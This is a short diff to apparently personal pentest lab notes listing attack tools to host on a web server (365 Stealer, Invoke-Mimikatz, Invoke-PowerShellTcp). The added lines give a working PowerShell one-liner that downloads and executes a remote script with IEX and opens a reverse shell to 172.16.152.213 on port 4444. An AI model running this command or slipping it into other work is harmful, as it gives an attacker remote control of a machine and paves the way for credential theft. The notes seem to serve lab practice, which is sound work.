@@ -36,4 +36,8 @@ Put in `C:\xampp\htdocs`:
 - 365 Stealer
 - ```Invoke-Mimikatz.ps1```
 - ```Invoke-PowerShellTcp.ps1```
-- ```studentx.ps1``` (uses the invoke-powershell.ps1 script to establish revshell)
+- ```studentx.ps1``` (uses the invoke-powershell.ps1 script to establish revshell):
+```
+powershell "IEX (New-Object Net.Webclient).downloadstring('http://172.16.152.213/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444"
+```
+
